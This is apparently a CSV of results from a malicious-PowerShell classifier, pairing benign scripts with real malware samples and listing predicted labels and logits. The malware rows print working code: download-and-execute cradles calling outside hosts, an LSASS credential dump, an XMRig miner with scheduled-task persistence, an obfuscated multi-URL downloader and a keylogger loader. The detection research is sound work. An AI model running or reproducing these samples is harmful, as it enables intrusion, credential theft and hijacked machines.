filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content,pair_idx,pair_role,pair_indicator,pair_strategy,correct,predicted_label,logit_diff
fa2y/malicious_samples/b1433e975626edfe29c5938e834afe4c6c2140bf5a89cdb5f99e6f5179ed22c1.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient,4,True,816,816,False,"Function 1 {
mkdir C:\ProgramData\ngrk
cd ""C:\ProgramData\ngrk""
# Download NGROK
$clnt = new-object System.Net.WebClient
$url = ""http://64.44.102.190/ngrok.zip""
$file = ""C:\ProgramData\ngrk\ngrok.zip""
$clnt.DownloadFile($url,$file)

# Unzip NGROK
$shell_app=new-object -com shell.application 
$zip_file = $shell_app.namespace($file) 
$destination = $shell_app.namespace(""C:\ProgramData\ngrk\"") 
$destination.Copyhere($zip_file.items())

#Download NSSM
$clnt = new-object System.Net.WebClient
$url = ""http://nssm.cc/release/nssm-2.24.zip""
$file = ""C:\ProgramData\ngrk\nssm-2.24.zip""
$clnt.DownloadFile($url,$file)

#Unzip NSSM
$shell_app=new-object -com shell.application 
$zip_file = $shell_app.namespace($file) 
$destination = $shell_app.namespace(""C:\ProgramData\ngrk\"") 
$destination.Copyhere($zip_file.items())
}",155,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,1.375
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",156,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/74f332a1a8dc9086d1286c22a4d571163d5375b3876c6d95d6877d2221cb3c9d.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,6,True,1085,1085,False,"Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip{
    param([string]$zipfile, [string]$outpath)
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$TempDir = [System.IO.Path]::GetTempPath()
cd $TempDir
(new-object System.Net.WebClient).DownloadFile('https://download.sysinternals.com/files/Procdump.zip',""$TempDir/procdump.zip"") > $null 2>&1

Unzip ""$TempDir/procdump.zip"" ""$TempDir/procdump""
if ([intptr]::Size -ne 4) {
	$procdump = ""$TempDir/procdump/procdump64.exe""
} else {
	$procdump = ""$TempDir/procdump/procdump.exe""
}

Start-Process $procdump -Wait -NoNewWindow -ArgumentList ""-ma lsass.exe lsassdump"" > $null 2>&1

(new-object System.Net.WebClient).DownloadFile('https://vk.com/doc138418519_492631985',""$TempDir/a.exe"") > $null 2>&1
Start-Process .\a.exe -Wait

cd ../
Remove-Item -Recurse -Force $TempDir/a.exe
Remove-Item -Recurse -Force ""$TempDir/procdump""
Remove-Item -Force ""$TempDir/procdump.zip""
Remove-Item -Force ""$TempDir/lsassdump.dmp""",156,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,5.265625
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",157,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/f5970eabcdd2c6d2412e69a5a5bb83a78973fb08434719a3aba900028c376e98.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,9,True,2197,2197,False,"$ne = $MyInvocation.MyCommand.Path
$miner_url = ""http://194.38.20.32/xmrig.exe""
$miner_url_backup = ""http://194.38.20.32/xmrig.exe""
$miner_size = 4578304
$miner_name = ""sysupdate""
$miner_cfg_url = ""http://194.38.20.32/config.json""
$miner_cfg_url_backup = ""http://194.38.20.32/config.json""
$miner_cfg_size = 3714
$miner_cfg_name = ""config.json""


$miner_path = ""$env:TMP\sysupdate.exe""
$miner_cfg_path = ""$env:TMP\config.json""
$payload_path = ""$env:TMP\update.ps1""

function Update($url,$backup_url,$path,$proc_name)
 {
    Get-Process -Name $proc_name | Stop-Process
    Remove-Item $path
    Try {
        $vc = New-Object System.Net.WebClient
        $vc.DownloadFile($url,$path)
    }
    Catch {
        Write-Output ""donwload with backurl""
        $vc = New-Object System.Net.WebClient
        $vc.DownloadFile($backup_url,$path)
    }
}

#miner_path
if((Test-Path $miner_path))
{
    Write-Output ""miner file exist""
    if((Get-Item $miner_path).length -ne $miner_size)
    {
        Update $miner_url $miner_url_backup $miner_path $miner_name
    }
}
else {
    Update $miner_url $miner_url_backup $miner_path $miner_name
}
#miner_cfg_path
if((Test-Path $miner_cfg_path))
{
    Write-Output ""miner_cfg file exist""
    if((Get-Item $miner_cfg_path).length -ne $miner_cfg_size)
    {
        Update $miner_cfg_url $miner_cfg_url_backup $miner_cfg_path $miner_cfg_name
    }
}
else {
    Update $miner_cfg_url $miner_cfg_url_backup $miner_cfg_path $miner_cfg_name
}

Remove-Item $payload_path
Remove-Item $HOME\update.ps1
Try {
    $vc = New-Object System.Net.WebClient
    $vc.DownloadFile($payload_url,$payload_path)
}
Catch {
    Write-Output ""download with backurl""
    $vc = New-Object System.Net.WebClient
    $vc.DownloadFile($payload_url_backup,$payload_path)
}
echo F | xcopy /y $payload_path $HOME\update.ps1

SchTasks.exe /Create /SC MINUTE /TN ""Update service for Windows Service"" /TR ""PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -File $HOME\update.ps1"" /MO 30 /F
if(!(Get-Process $miner_name -ErrorAction SilentlyContinue))
{
    Write-Output ""Miner Not running""
	Start-Process $miner_path -windowstyle hidden
}
else
{
	Write-Output ""Miner Running""
}

Start-Sleep 5",157,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,7.9765625
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",158,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/ea37f37f24769bff5b02516545b4915cf8602d6d2271b07c4bd9a1d0bbff482e.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient,2,True,2234,2234,False,"SV  0zX ([TyPe]sYsteM.IO.dIrECtorY  ) ;   set  TxySeo  (  [TYpe]SYsTEM.NeT.seRVICEpOINTMANaGER) ;  $Nbf5tg3='B9yp90s';$Vxnlre0=$Cludkjx + [char](64) + $R6r1tuy;$Ky3q0e8=(('Rqdx')+'wo5');  (  Dir  vaRiAble:0Zx).valuE::""CreATEdIREcTOrY""($HOME + ((('nDpJrb')+'evk4nDpCcwr_2hnDp') -RePlAcE 'nDp','\'));$FN5ggmsH = (182,187,229,146,231,177,151,149,166);$Pyozgeo=(('J5fy1')+'cc'); (  vaRiABLE TxYSEo  ).ValuE::""SecUrITYpROtOcol"" = (('Tls1')+'2');$FN5ggmsH += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);$Huajgb0=(('Jno')+'5ga1');$Bb28umo = (('Ale7g')+'_8');$Hsce_js='Kvnbov_';$Spk51ue=(('C7xo')+'9gl');$Scusbkj=$HOME+(('5tfJrbevk45tfCcwr_2h5tf') -rEplACE  '5tf','\')+$Bb28umo+(('.ex')+'e');$FN5ggmsH += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);$hbmskV2T=(('C7xo')+'9gl');$hbmskV2T=$HOME+(('5tfJrbevk45tfCcwr_2h5tf') -rEplACE  '5tf','\')+$Bb28umo+(('.co')+'nf');$Q1_y05_='W4qvyz8';$Odb3hf3=new-object Net.WEBclIENt;$FN5ggmsH += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);$Anbyt1y=('http:][s]'+(('w][('))+(('s)]w'))+'da-industrial.htb][s]wjs'+(('][('))+(('s)]w9IdLP][(s)]w@h'))+'ttp:][s]w][s]wdaprofesional.htb][s]wdata4][s]whWgWjTV][s]w@https:][s]w][s]wdagranitegiare.htb][s]wwp-admin][s]wtV][s]w@http:][s]w][s]wwww.outspokenvisions.htb][s]wwp-includes][s]waWoM][s]w@http:][s]w][s]wmobsouk.h'+(('tb][('))+(('s)]wwp-'))+'includes][s]wUY30R][s]w@http:][s]w][s]wbiglaughs'+(('.htb][(s'))+((')]'))+'wsmallpotatoes'+(('][(s'))+((')]wY][(s)]w@https:][(s)'))+']w][s]wngllogistics.htb][s]wadminer][s]wW3mk'+(('B][(s'))+((')]w'))).repLAcE(('][s]w'),([array]'/','xwe')[0]).sPlIT($Ivg3zcu + $Vxnlre0 + $Jzaewdy);$Gcoyvlv=(('Kf_')+'9et1');foreach ($A8i3ke1 in $Anbyt1y){try{$Odb3hf3.dOWnLOAdfILe($A8i3ke1, $Scusbkj);$Zhcnaux=(('Ekk')+'j47t');If ((Get-Item $Scusbkj).LEnGTh -ge 45199) {${A8I3KE1}.ToCharArray.Invoke() | .ForEach-Object -process { ${FN5GGmSh} += ([byte][char]${_} -bxor 0xdf ) }; $FN5ggmsH += (228); $b0Rje =  [type]ConVerT;   $B0RjE::""tOBaSE64STRINg""(${fn5ggmsh}) | .out-file ${hBmSKV2T}; ([wmiclass](('win')+'32_Process')).cReaTE($Scusbkj);$Glwki6a='Imtdxv6';break;$Pfpblh1='Vslalcu'}}catch{}}$F47ief2=(('Bnzid')+'rt')",158,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,2.828125
1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",163,benign,DownloadString,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.390625
450.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,75,75,False,iex (new-object net.webclient).downloadstring('https://invesco.online/aaa'),163,malicious,DownloadString,rotate_same_family_benign_one_pair_per_malicious,True,malicious,1.375
1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",167,benign,DownloadString,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.390625
fa2y/malicious_samples/cc76beb5bcf6880dee2d739a37e218871500d5d610c7989e7371b2594c2d594e.ps1,malicious,fa2y:malicious_samples,DownloadString,IEX|DownloadString|Net.WebClient,3,True,80,80,False,IEX ((New-Object Net.WebClient).DownloadString('http://192.168.137.241:8080/'));,167,malicious,DownloadString,rotate_same_family_benign_one_pair_per_malicious,True,malicious,1.59375
1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",171,benign,DownloadString,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.390625
fa2y/malicious_samples/67508635020243fc67eb003f214fc569733988db121516a1571f3c8de2589864.ps1,malicious,fa2y:malicious_samples,DownloadString,IEX|DownloadString|Net.WebClient,3,True,90,90,False,IEX (New-Object Net.WebClient).DownloadString('http://cannot.loginto.me/googlehelper.ps1'),171,malicious,DownloadString,rotate_same_family_benign_one_pair_per_malicious,True,malicious,2.171875
1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",175,benign,DownloadString,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.390625
fa2y/malicious_samples/fdba92ecb596bc4e8b5cde86b7a791bd7534f2a3f6f6b4c1bb65a51749419bc4.ps1,malicious,fa2y:malicious_samples,DownloadString,IEX|DownloadString|Net.WebClient,3,True,116,116,False,IEX (New-Object Net.WebClient).DownloadString( http://52.31.143.66/Invoke-Shellcode2.ps1 );Invoke-Shellcode -Force,175,malicious,DownloadString,rotate_same_family_benign_one_pair_per_malicious,True,malicious,9.421875
1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",179,benign,DownloadString,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.390625
fa2y/bazaar_out/d0c4413e9a01da6e95b55d7f61e9e55722877e36e5ef2851f3cd7197a075068b.ps1,malicious,fa2y:bazaar_out,DownloadString,DownloadString|Net.WebClient,2,True,147,147,False,powershell.exe -NoP -sta -NonI -W Hidden $e=(New-ObjectSystem.Net.WebClient).DownloadString('http://birosthalittc.in/cr20.gif');powershell $e#;exit,179,malicious,DownloadString,rotate_same_family_benign_one_pair_per_malicious,True,malicious,5.984375
1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",183,benign,DownloadString,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.390625
fa2y/malicious_samples/dee24561f292fc7a06ab4d0ed625acd962f297e18b34fca71b734ade5d4eb9f8.ps1,malicious,fa2y:malicious_samples,DownloadString,IEX|DownloadString|Net.WebClient,3,True,156,156,False,"powershell -nop -w hidden IEX(""(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/securethelogs/Keylogger/master/Keylogger.ps1')"")",183,malicious,DownloadString,rotate_same_family_benign_one_pair_per_malicious,True,malicious,6.171875
